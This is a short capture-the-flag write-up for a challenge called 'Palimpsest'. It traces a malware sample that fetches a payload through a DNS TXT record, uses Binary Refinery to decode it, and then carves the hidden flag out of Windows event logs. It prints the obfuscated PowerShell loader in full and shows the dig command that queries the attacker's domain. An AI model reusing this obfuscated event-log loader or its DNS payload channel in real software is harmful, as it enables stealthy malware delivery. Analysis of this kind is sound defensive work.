# Palimpsest

`Updater Service.xml` gets a payload from `5aa456e4dbed10b.pyrchdata.com` via DNS (TXT record).

Use Binary Refinery to extract the payload (doable by hand but annoying):

```shell
% dig +short -t TXT 5aa456e4dbed10b.pyrchdata.com | r.resub '[" ]' '' | r.csd b64 | r.csd b64 | r.zl | r.csd intarray | r.xor h:5d
$01Idu9 =[tYPE]("{1}{2}{0}"-f 'e','io','.fiL') ; ${a} = 40000..65000; ${b} =  $01Idu9::("{1}{0}{2}" -f 'ri',("{1}{0}" -f'penW','O'),'te').Invoke((Join-Path -Path ${EnV
:a`P`p`DAta} -ChildPath flag.mp4)); Get-EventLog -LogName ("{0}{2}{1}{3}" -f 'Ap','licati','p','on') -Source ("{0}{2}{1}"-f'mslnstal','er','l') | ? { ${A} -contains ${
_}."In`st`AnCe`iD" } | Sort-Object Index | % { ${C} = ${_}."d`ATa"; ${b}.("{1}{0}"-f 'ite','Wr').Invoke(${C}, 0, ${C}."LeN`GTh") }; ${b}.("{1}{0}" -f ("{0}{1}" -f 'los
','e'),'C').Invoke()
```

Pay close attention to the `-LogName ("{0}{2}{1}{3}" -f 'Ap','licati','p','on')` and ` -Source ("{0}{2}{1}"-f'mslnstal','er','l')` part.

Looking at that it seems it extracts data from `Application` log, something that is called `mslnstaller`. Grep is
industry standard way of parsing XML data, remember that! (lol)

```shell
% evtx_dump Application.evtx | grep -i mslnstaller -A25 | grep '<Binary>' | r.carve uppercase-hex | r.hex > flag.mp4
```
